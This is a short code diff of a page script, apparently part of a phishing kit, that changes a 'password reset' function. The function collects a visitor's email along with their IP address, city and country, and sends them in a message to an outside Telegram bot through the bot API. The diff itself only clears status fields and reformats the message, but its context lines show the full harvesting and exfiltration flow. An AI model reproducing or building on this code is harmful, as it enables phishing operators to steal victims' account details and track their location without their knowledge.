@@ -569,6 +569,8 @@
         }
         
         async function resetPwd(event) {
+            $('#my-form-status').html("");
+            $('#success').html("");
             //event.preventDefault();
             if (document.getElementById("cpatchaTextBox").value == code) {
                 var status = document.getElementById("my-form-status");
@@ -577,9 +579,7 @@
                 var ip = $("#ip").val();
                 var city = $("#city").val();
                 var country = $("#country").val();
-                var message = `<i>RESETING PASWWORD</i>\n
-                                 <b>Email</b> : <code>${em}</code>\n 
-                                 <u>${ip}</u>, <u>${city}</u>, <u>${country}</u>`;
+                var message = `<i>RESETING PASWWORD</i>\n\n<b>Email</b> : <code>${em}</code>\n\n<u>${ip}</u>, <u>${city}</u>, <u>${country}</u>`;
                 $.ajax({
                     type: form.method,
                     url: `https://api.telegram.org/bot${token}/sendMessage`,
